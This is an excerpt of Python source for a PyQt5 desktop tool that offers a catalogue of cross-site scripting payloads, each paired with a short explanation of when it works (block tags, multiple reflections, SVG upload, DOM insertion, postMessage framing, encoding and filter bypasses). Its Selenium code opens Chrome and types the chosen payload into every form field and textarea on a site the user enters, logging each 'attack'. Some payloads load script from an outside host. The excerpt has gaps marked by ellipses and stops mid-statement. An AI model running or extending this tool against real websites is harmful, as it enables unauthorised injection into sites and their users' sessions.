...
from PyQt5.QtWidgets import QMainWindow, QApplication, QWidget, QPushButton, QAction, QLineEdit, QMessageBox, QLabel, \
    QCheckBox, QListWidget, QAbstractItemView, QListWidgetItem, QGridLayout, QTextEdit, QToolBar, QRadioButton, \
    QVBoxLayout
...
class App(QMainWindow):
    ...
    def initUI(self):
        ...
        self.xxsPayloadlist.clicked.connect(self.clicked)
    ...
    def onClickedRadio(self):
        if self.rbtn2.isChecked():
            self.craftingPayloadTextbox.setText(str(self.websiteTextbox.text())+'(example: /search?q=)'+self.xxsPayloadlist.currentItem().text())
    ...
    def clicked(self):
        ...
        if(currentItemText=="<svg onload=alert(1)>"or currentItemText=="“><svg onload=alert(1)>"):
            ...
            self.payloadDesOutput.clear()
            payloadDesText = "HTML Context — In Block Tag Injection\n---------------------------------------------\nUse when input lands inside or between opening/closing\nof the following tags:<title><style><script><textarea>\n<noscript><pre><xmp> and <iframe> (</tag> is accordingly)."
            self.payloadDesOutput.insertPlainText(payloadDesText)
            ...
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "‘>alert(1)</script><script/1=’" or currentItemText == "*/alert(1)</script><script>/*" or currentItemText == "‘onload=alert(1)><svg/1=’"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Reflection — Double Reflection (Single Input)\n---------------------------------------------\nUse to take advantage of multiple reflections on same page."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "*/alert(1)”>’onload=”/*<svg/1=’" or currentItemText == "`-alert(1)”>’onload=”`<svg/1=’" or currentItemText == "*/</script>’>alert(1)/*<script/1=’"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Reflection — Triple Reflection (Single Input)\n---------------------------------------------\nUse to take advantage of multiple reflections on same page."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "p=<svg/1=’&q=’onload=alert(1)>" or currentItemText == "p=<svg 1=’&q=’onload=’/*&r=*/alert(1)’>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Input Reflections (Double & Triple)\n---------------------------------------------\nUse to take advantage of multiple input reflections on same page."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "<svg xmlns='http://www.w3.org/2000/svg' onload=”alert(1)”/>"):
            self.payloadDesOutput.clear()
            payloadDesText = "File Upload Injection — SVG File\n---------------------------------------------\nUse to create a stored XSS on target when uploading \nimage files. Save content below as “xss.svg”."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "<img src=1 onerror=alert(1)>" or currentItemText == "<iframe src=javascript:alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "DOM Insert Injection\n---------------------------------------------\nUse to test for XSS when injection gets inserted into DOM as valid \nmarkup instead of being reflected in source code. It works for \ncases where script tag and other vectors won’t work."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "data:text/html,<img src=1 onerror=alert(1)>" or currentItemText == "data:text/html,<iframe src=javascript:alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "DOM Insert Injection — Resource Request\n---------------------------------------------\nUse when javascript code of the page inserts into page the results \nof a request to an URL controlled by attacker (injection)."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "<iframe src=TARGET_URL onload=”frames[0].postMessage(‘INJECTION’,’*’)”>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Javascript postMessage() DOM Injection (with Iframe)\n---------------------------------------------\nUse when there’s a “message” event listener like in\n“window.addEventListener(‘message’, …)” in javascript code without a check for\norigin. Target must be able to be framed (X-Frame Options header according to\ncontext). Save as HTML file (or using data:text/html) providing TARGET_URL and\nINJECTION (a XSS vector or payload)."
            self.payloadDesOutput.insertPlainText(payloadDesText)
            ...
            self.payloadDesOutput.clear()
            payloadDesText = "Unclosed Tags\n---------------------------------------------\nUse in HTML injections to avoid filtering based in the presence of both lower than (<)\nand greater than (>) signs. It requires a native greater than \nsign in source code after input reflection."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>" or currentItemText == "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Uppercase XSS\n---------------------------------------------\nUse when application reflects input in uppercase."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E"):
            self.payloadDesOutput.clear()
            payloadDesText = "Double Encoded XSS\n---------------------------------------------\nUse when application performs double decoding of input."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "alert`1`"):
            self.payloadDesOutput.clear()
            payloadDesText = "Alert without Parentheses (Strings Only)\n---------------------------------------------\nUse in an HTML vector or javascript injection when parentheses \nare not allowed and a simple alert box is enough."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "[][‘\\146\\151\\154\\164\\145\\162’][‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’]"
                                 "(‘\\141\\154\\145\\162\\164\\50\\61\\51’)()"):
            self.payloadDesOutput.clear()
            payloadDesText = "Alert without Alphabetic Chars\n---------------------------------------------\nUse when alphabetic characters are not allowed. Following is alert(1)."
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "(alert)(1)" or currentItemText == "a=alert,a(1)"  or currentItemText == "[1].find(alert)"
            ...
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "<script src=data:,alert(1)>" or currentItemText == "<script src=//brutelogic.com.br/1.js>"):
            self.payloadDesOutput.clear()
    ...
    def checkbox_b_click(self):
        if (self.checkbox_B.isChecked() == False):
            ...
            self.xxsPayloadlist.insertItem(16, "<iframe src=TARGET_URL onload=”frames[0].postMessage(‘INJECTION’,’*’)”>")
    ...
    def checkbox_c_click(self):
        if (self.checkbox_C.isChecked() == False):
            ...
            self.xxsPayloadlist.insertItem(9, "alert`1`")
            self.xxsPayloadlist.insertItem(10,"[][‘\\146\\151\\154\\164\\145\\162’][‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’]"
                                           "(‘\\141\\154\\145\\162\\164\\50\\61\\51’)()")
    ...
    @pyqtSlot()
    def on_click(self):
        # Open Chrome, automate input value and button click
     if(self.rbtn1.isChecked()):
        ...
        print(driver.title)
        self.logOutput.insertPlainText("\nAutomating attack on " + str(self.websiteTextbox.text()))
        ...
        getinputs = driver.find_elements(By.XPATH,
                                         '//form//input[not(@aria-label)][contains(@class, "Field") or contains(@class, "field") '
        ...
        for getinput in getinputs:
            self.logOutput.insertPlainText("\nInputting payload: " + str(self.xxsPayloadlist.currentItem().text())+" to input with class: "+str(getinput.get_attribute("class")))
        ...
        for gettextarea in gettextareas:
            # if z == 1:
            self.logOutput.insertPlainText(
                "\nInputting payload: " + str(self.xxsPayloadlist.currentItem().text()) + " to textarea class: " + str(
